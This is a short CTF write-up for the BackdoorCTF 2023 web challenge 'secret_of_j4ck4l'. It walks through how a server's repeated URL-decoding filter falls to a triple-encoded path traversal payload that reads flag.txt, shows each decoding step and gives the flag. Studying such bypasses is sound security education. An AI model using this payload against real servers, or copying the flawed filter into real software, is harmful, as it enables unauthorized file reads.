---
title: "secret_of_j4ck4l"
description: "I left a message for you. You will love it definitely"
pubDate: 2023-12-18
ctf: "BackdoorCTF 2023"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/23-backdoor/icon.png"
imageDir: "images/23-backdoor"
---

`http://x.x.x.x:8003/read_secret_message?file=message`

This is a website that seems to read a local file from a parameter `file`, so immediately keeping an eye out for LFI before looking at the source code.

The code has a very... interesting filtering system.
```python
def ignore_it(file_param):
	yoooo = file_param.replace('.', '').replace('/', '')
	if yoooo != file_param:
		return "Illegal characters detected in file parameter!"
	return yoooo

def another_useless_function(file_param):
	return urllib.parse.unquote(file_param)

def useless (file_param):
	file_param1 = ignore_it(file_param)
	file_param2 = another_useless_function(file_param1)
	file_param3 = ignore_it(file_param2)
	file_param4 = another_useless_function(file_param3)
	file_param5 = another_useless_function(file_param4)
	return file_param5
```

The issue with this 'filtering' is its incredibly reliant on just, hoping nobody tests it. The `ignore_it` function filters all instances of `.` and `/` found in the URL, but not for recursive URL encoding. 
Due to % in hex being `25` we can apply repeated url encoding to get our payload to bypass the filter.

Payload: `%25252e%25252e%25252fflag%25252etxt`

In the server the payload is parsed as follows: (each line is a line in the 'useless' function)

```
file_param = %25252e%25252e%25252fflag%25252etxt
fileparam1 = %252e%252e%252fflag%252etxt
fileparam2 = %2e%2e%2fflag%2etxt
fileparam3 = %2e%2e%2fflag%2etxt
fileparam4 = ../flag.txt
fileparam5 = ../flag.txt
```

After sending we get our flag back:

Flag: `flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}`

**Files:** [public.zip](https://web.archive.org/web/20231218155757/https://backdoor.infoseciitr.in/uploads?key=b0e84ea81114b302036097a2b11d446a0f82ead89ebc09a5bfc9ed70a4601607%2Fpublic.zip)